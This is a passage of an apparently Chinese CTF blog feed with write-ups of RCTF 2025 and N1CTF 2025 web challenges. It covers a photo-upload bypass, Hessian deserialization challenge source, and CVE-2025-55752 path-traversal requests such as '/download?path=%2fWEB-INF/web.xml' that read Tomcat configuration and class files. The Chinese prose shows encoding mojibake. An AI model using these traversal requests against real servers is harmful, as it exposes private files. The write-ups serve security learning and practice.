punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'tmp_name'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'size'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token class-name static-context">Photo</span><span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string single-quoted-string">'user_id'</span> <span class="token operator">=></span> <span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'original_filename'</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'saved_filename'</span> <span class="token operator">=></span> <span class="token variable">$savedFilename</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'size'</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'width'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_make'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'make'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_model'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_exposure_time'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exposure_time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_f_number'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f_number'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_iso'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iso'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_focal_length'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'focal_length'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_date_taken'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'date_taken'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_artist'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'artist'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_copyright'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'copyright'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_software'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'software'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_orientation'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'orientation'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ content-type ä¸º -1 å³å¯ï¼Œå» space é‡Œçš„ blog å†™ç‚¹ä¸œè¥¿ä¼ å›¾ç‰‡</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251117010943823.png"></p><p>ç„¶åè®¾ç½®å›¾ç‰‡ä¸º background</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251117011019625.png"></p><p>å†è®¿é—® superadmin.php å³å¯å¾—åˆ° flagï¼š<code>RCTF&#123;h4rd_70_54y_wh37h3r_175_4_bu6_0r_4_f347ur3&#125;</code></p><hr><h1 id="maybe-easyï¼ˆUnsolvedï¼‰"><a href="#maybe-easyï¼ˆUnsolvedï¼‰" class="headerlink" title="maybe_easyï¼ˆUnsolvedï¼‰"></a>maybe_easyï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RCTFController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/hello"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"data"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token class-name">HessianFactory</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾æ˜¯ Hessian ååºåˆ—åŒ–</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rctf<span class="token punctuation">.</span>server<span class="token punctuation">.</span>tool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Hessian2Input</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Hessian2Output</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">SerializerFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HessianFactory</span> <span class="token keyword">extends</span> <span class="token class-name">SerializerFactory</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">WHITE_PACKAGES</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HessianFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ClassLoader</span> <span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WhiteListClassLoader</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">String</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">T</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hessian2Output</span> hessian2Output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        hessian2Output<span class="token punctuation">.</span><span class="token function">getSerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowNonSerializable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hessian2Output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>        hessian2Output<span class="token punctuation">.</span><span class="token function">flushBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hessian2Input</span> h2i <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>        h2i<span class="token punctuation">.</span><span class="token function">setSerializerFactory</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HessianFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> h2i<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.rctf.server.tool."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.util."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.logging."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.springframework.beans."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.springframework.jndi."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">WhiteListClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ClassLoader</span> parent<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">WhiteListClassLoader</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> allowed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> prefix <span class="token operator">:</span> <span class="token class-name">HessianFactory</span><span class="token punctuation">.</span><span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    allowed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"Class not allowed for deserialization: "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™½åå•ï¼Œè§‚å¯Ÿä¸€ä¸‹ com.rctf.server.tool.Maybe</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Maybe</span> <span class="token keyword">extends</span> <span class="token class-name">Proxy</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Maybe</span><span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span> h<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name">Comparable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"compareTo"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>o<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span>result<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥è¿½åˆ°å‡ºé¢˜äººåšå®¢ï¼š <a href="https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/">https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/</a></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;n1 çš„ wpï¼š &lt;a href=&quot;https://wx.zsxq.com/group/824215518412&quot;&gt;https://wx.zsxq.com/group/824215518412&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ROIS å®˜æ–¹çš„ wpï¼š &lt;a href=&quot;https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/&quot;&gt;https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SU çš„ wpï¼š &lt;a href=&quot;https://su-team.cn/post/rctf-2025-su-wu/&quot;&gt;https://su-team.cn/post/rctf-2025-su-wu/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>N1CTF 2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/02/N1CTF-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/02/N1CTF-2025/</id>
    <published>2025-11-01T16:56:08.000Z</published>
    <updated>2025-11-14T17:38:01.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ‰“ä¸€åŠå€¦äº†ï¼Œæ²¡ç²¾åŠ›æ‰“åªèƒ½åé¢å¤ç°ä¸‹é¢˜ç›®</p><p>å‚è€ƒï¼š</p><p><a href="https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/">https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/</a></p><span id="more"></span><hr><h1 id="n1catï¼ˆå¤ç°ï¼‰"><a href="#n1catï¼ˆå¤ç°ï¼‰" class="headerlink" title="n1catï¼ˆå¤ç°ï¼‰"></a>n1catï¼ˆå¤ç°ï¼‰</h1><blockquote><p>CVE-2025-55752 + é«˜ç‰ˆæœ¬ JNDI æ³¨å…¥ + æœ€æ–°æœ€çƒ­ jdk17 åŸç”Ÿé“¾</p></blockquote><p>ç»™äº†ä¸€ä¸ª apache é…ç½®æ–‡ä»¶</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">RewriteCond %&#123;QUERY_STRING&#125; (^|&amp;)path</span><span class="token punctuation">=</span><span class="token value attr-value">([^&amp;]+)</span>RewriteRule ^/download$ /%2 [B,L]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&#x2F;download è·¯ç”±æ¥æ”¶ä¸€ä¸ª path å‚æ•°</p><p>æµ‹è¯•å‘ç°æœåŠ¡å™¨ç‰ˆæœ¬ä¸º Tomcat&#x2F;9.0.108</p><p>æœ‰ CVE-2025-55752ï¼š<a href="https://cn-sec.com/archives/4639480.html">https://cn-sec.com/archives/4639480.html</a></p><p>é‚£ä¹ˆæ„é€  urlï¼š<code>/download?path=%2fWEB-INF/web.xml</code></p><p>web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>welcomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>ctf.n1cat.welcomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>welcomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—çŸ¥ç±»åç§°ä¸è·¯å¾„ <code>/download?path=%2fWEB-INF/classes/ctf/n1cat/welcomeServlet.class</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ctf<span class="token punctuation">.</span>n1cat</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token 